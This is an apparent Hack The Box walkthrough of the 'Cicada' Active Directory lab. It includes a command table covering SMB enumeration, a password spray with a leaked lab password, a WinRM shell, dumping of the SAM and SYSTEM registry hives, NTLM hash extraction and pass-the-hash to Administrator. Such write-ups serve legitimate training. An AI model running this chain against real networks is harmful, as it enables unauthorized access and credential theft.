# 🖥️ Hack The Box – "Cicada" Lab Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Cicada-green?logo=hackthebox)](https://www.hackthebox.com)
[![Pentest Lab](https://img.shields.io/badge/Type-Active%20Directory-blue)](#)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-yellow)](#)
[![Theme](https://img.shields.io/badge/Theme-Windows%20AD-lightgrey)](#)

---

## 📌 General Summary

 This walkthrough details the compromise of **"Cicada"**, a Windows Active Directory (AD) machine on Hack The Box (HTB).  
 The attack chain moves from enumeration to privilege escalation using `SeBackupPrivilege` and pass-the-hash.

**Key Stages:**
- 🔍 Recon & Enumeration (ports, services, SMB shares, AD users)
- 🔑 Credential Harvesting (found in scripts/shares)
- 🚪 Authentication & Password Sprays
- 📂 Share Access & Further Secrets Discovery
- 📈 Privilege Escalation via Backup Privileges
- 💀 Administrator Access via NTLM Pass-the-Hash

---

## 📜 Attack Flow Overview

1. **Recon:** Enumerate ports, services, SMB shares, AD users.  
2. **Cred Harvesting:** Find plaintext credentials in shares or scripts.  
3. **Password Attacks:** Spray credentials for valid logins.  
4. **Pivoting:** Use compromised accounts to explore further assets.  
5. **Privilege Escalation:** Exploit `SeBackupPrivilege` to dump registry hives.  
6. **Hash Extraction & PtH:** Use NTLM hashes to become Administrator.  

---

<details>
<summary>💻 <strong>Commands Used & Their Purpose</strong> (click to expand)</summary>

| Command | Purpose & Description |
|---------|-----------------------|
| `nmap -sC -sV -Pn 10.10.11.35` | Scan target for open ports, services, and default scripts. |
| `echo "10.10.11.35 cicada.htb" | sudo tee -a /etc/hosts` | Add domain mapping locally. |
| `crackmapexec smb cicada.htb --shares` | List SMB shares anonymously. |
| `crackmapexec smb cicada.htb -u 'guest' -p '' --shares` | List SMB shares as guest. |
| `smbclient //cicada.htb/HR` | Connect to "HR" SMB share. |
| `dir` *(within smbclient)* | List files inside share. |
| `get "Notice from HR.txt"` *(within smbclient)* | Download file from SMB. |
| `impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass` | Enumerate domain SIDs. |
| `impacket-lookupsid ...` | `grep 'SidTypeUser'` | Extract user accounts only. |
| `crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'` | Password spray users. |
| `crackmapexec smb cicada.htb -u michael.wrightson ... --users` | List users with credentials. |
| `crackmapexec smb cicada.htb -u david.orelious ... --shares` | Check shares with David's creds. |
| `smbclient //cicada.htb/DEV -U 'david.orelious%...'` | Connect to "DEV" SMB share. |
| `get Backup_script.ps1` *(within smbclient)* | Download script. |
| `evil-winrm -u emily.oscars ... -i cicada.htb` | Remote shell access. |
| `whoami /priv` | Check privileges. |
| `reg save hklm\sam sam` | Save SAM hive. |
| `reg save hklm\system system` | Save SYSTEM hive. |
| `download sam` | Download SAM hive locally. |
| `download system` | Download SYSTEM hive locally. |
| `impacket-secretsdump -sam sam -system system local` | Extract NTLM hashes. |
| `evil-winrm -u Administrator -H <hash> -i cicada.htb` | Pass-the-hash to Admin. |

</details>

---
<details>
<summary>💻 <strong>Stepwise PoC</strong> (click to expand)</summary>

<img width="1529" height="714" alt="1" src="https://github.com/user-attachments/assets/e87e4402-c194-434a-be20-1d091e0c4264" />
<img width="1527" height="576" alt="2" src="https://github.com/user-attachments/assets/a232a0e0-2e7b-43b6-b2b3-0720c15a0dd0" />
<img width="843" height="66" alt="3" src="https://github.com/user-attachments/assets/629a1cc5-b20e-49a8-973e-6e0bed57da7e" />
<img width="1588" height="213" alt="4" src="https://github.com/user-attachments/assets/a5bef22c-5874-4d12-bd93-0e34f5096412" />
<img width="1572" height="467" alt="5" src="https://github.com/user-attachments/assets/36d4061b-64e2-4b79-b756-100ddd26dff0" />
<img width="1442" height="437" alt="6" src="https://github.com/user-attachments/assets/2d1f1047-4f38-47a1-9e95-a576f30cf461" />
<img width="1768" height="718" alt="7" src="https://github.com/user-attachments/assets/ed7e968a-7b67-4b18-8ecf-a7e08b0d9c8a" />
<img width="1248" height="555" alt="8" src="https://github.com/user-attachments/assets/8a405c0a-88a6-40cb-8998-15c8edcc51c0" />
<img width="830" height="407" alt="9" src="https://github.com/user-attachments/assets/60833066-52bb-47cc-acea-a6c501eac049" />
<img width="1134" height="449" alt="10" src="https://github.com/user-attachments/assets/f961c78e-a3e7-4ed2-94b9-7c8c26cf952c" />
<img width="1548" height="473" alt="11" src="https://github.com/user-attachments/assets/65e5eb67-6b16-4b74-96ee-bba1729f5240" />
<img width="1500" height="475" alt="12" src="https://github.com/user-attachments/assets/2fed2796-0a6d-4ff1-ad4a-de8f27dd40ac" />
<img width="1555" height="592" alt="13" src="https://github.com/user-attachments/assets/9e7e9352-6453-4e19-9249-d128bd13a256" />
<img width="1536" height="478" alt="14" src="https://github.com/user-attachments/assets/b1e954f3-4f88-4c06-a300-9d6b81f2c267" />
<img width="1404" height="373" alt="15" src="https://github.com/user-attachments/assets/6f0aff03-85ce-4adc-a0e2-60a3c1afc26f" />
<img width="1470" height="484" alt="16" src="https://github.com/user-attachments/assets/d75d281d-3936-43a9-95cb-b8cd8af3d770" />
<img width="1012" height="380" alt="17" src="https://github.com/user-attachments/assets/c04f7488-9cc0-458c-b9b8-2ce5e5033467" />
<img width="1011" height="407" alt="18" src="https://github.com/user-attachments/assets/700ac6d5-7d65-4a0f-99fe-12b2b4a7618e" />
<img width="748" height="346" alt="19" src="https://github.com/user-attachments/assets/9a3694f2-b47c-448b-aecd-4cf29e58809c" />
<img width="966" height="310" alt="20" src="https://github.com/user-attachments/assets/b120896d-50e7-47d9-ba36-07a0890c7cc8" />
<img width="1008" height="407" alt="21" src="https://github.com/user-attachments/assets/777abf77-0d39-4150-b560-b01e2eed2321" />
<img width="1016" height="471" alt="22" src="https://github.com/user-attachments/assets/ef0e2aad-77a6-4b21-afed-951e72a69248" />

</details>

---

## 🛠 Toolset Notes

- **nmap** → Reconnaissance & service identification.  
- **crackmapexec** → SMB enumeration, credential spraying, privilege checks.  
- **smbclient** → Manual SMB interaction and file retrieval.  
- **evil-winrm** → Windows remote post-exploitation shell.  
- **reg save** → Registry dump for SAM & SYSTEM.  
- **impacket-secretsdump** → Extracts NTLM hashes from hives.  
- **Pass-the-Hash** → Authenticate with NTLM without knowing the plaintext password.

---
